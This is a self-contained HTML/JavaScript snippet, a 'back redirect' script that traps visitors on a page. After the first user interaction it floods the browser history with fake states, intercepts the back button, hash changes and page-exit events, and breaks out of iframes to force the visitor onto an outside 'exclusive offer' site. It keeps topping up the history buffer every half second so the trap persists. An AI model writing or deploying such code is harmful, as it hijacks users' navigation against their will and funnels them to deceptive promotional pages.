    <!-- Ultra-Robust Back Redirect Script -->
    <script>
    (function (window, location) {
      var REDIRECT_URL = "https://ofertaexclusiva.figma.site/";
      var FLAG = "br_active";

      function executeRedirect() {
        if (sessionStorage.getItem(FLAG)) return;
        sessionStorage.setItem(FLAG, "true");
        
        try {
          // Attempt to break out of iframes if applicable (Figma.site uses frames)
          if (window.top !== window.self) {
            window.top.location.replace(REDIRECT_URL);
          } else {
            window.location.replace(REDIRECT_URL);
          }
        } catch (err) {
          window.location.replace(REDIRECT_URL);
        }
      }

      function populateHistory() {
        // We push multiple states to ensure that any 'Back' gesture or click 
        // lands on one of our states instead of leaving the page.
        try {
          for (var i = 0; i < 10; i++) {
            window.history.pushState({ trap: i, ts: Date.now() }, "", location.href);
          }
        } catch (e) {}
      }

      // Interaction trigger: Modern browsers only allow deep history manipulation after user interaction
      var triggerEvents = ['click', 'mousedown', 'touchstart', 'scroll', 'wheel', 'keydown'];
      var isPrimed = false;

      function onUserInteraction() {
        if (isPrimed) return;
        isPrimed = true;
        populateHistory();
        // Cleanup listeners to prevent performance overhead
        triggerEvents.forEach(function(evt) {
          window.removeEventListener(evt, onUserInteraction);
        });
      }

      triggerEvents.forEach(function(evt) {
        window.addEventListener(evt, onUserInteraction, { passive: true });
      });

      // Handle the "Back" event
      window.addEventListener("popstate", function (event) {
        executeRedirect();
        // Repopulate as a safety measure if the first redirect fails
        if (isPrimed) populateHistory();
      });

      // SPAs often use hash-based routing. Catching hash changes is critical.
      window.addEventListener("hashchange", function () {
        executeRedirect();
      });

      // Persistence Monitor: Figma's internal router might 'clean' the history.
      // This interval ensures we always have a buffer of at least 5 states.
      setInterval(function() {
        if (isPrimed && window.history.length < 5) {
          populateHistory();
        }
      }, 500);

      // Terminal exit triggers
      window.addEventListener("beforeunload", executeRedirect);
      window.addEventListener("pagehide", executeRedirect);

    })(window, window.location);
    </script>
